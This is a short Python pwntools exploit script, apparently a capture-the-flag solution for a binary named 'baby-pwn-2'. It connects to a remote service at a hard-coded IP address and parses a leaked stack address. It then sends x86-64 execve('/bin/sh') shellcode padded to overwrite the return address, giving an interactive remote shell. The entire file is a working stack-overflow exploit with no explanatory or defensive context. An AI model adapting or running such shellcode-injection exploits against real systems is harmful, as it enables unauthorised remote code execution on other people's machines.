from pwn import *
context.arch ='amd64'
elf = ELF("baby-pwn-2")

r = elf.process()

#gdb.attach(r, """
#           break main
#           """)

r = remote("34.162.119.16", 5000)
ret = r.recv().decode("utf-8")
print(ret)
stack = ret.split('\n')[1].split(': ')[1]
stack = int(stack,16)
print(hex(stack))

get_shell = """
                lea rdi,[rip+binsh]
                xor rsi,rsi
                xor rdx, rdx
                mov rax, 59
                syscall
                mov rax,60
                syscall
binsh:
                .string "/bin/sh"
               """

payload0 = asm(get_shell, arch='amd64')
shellcode_len = len(payload0)
payload = payload0 + b'a'*(72-shellcode_len)+p64(stack)
r.sendline(payload)
r.interactive()
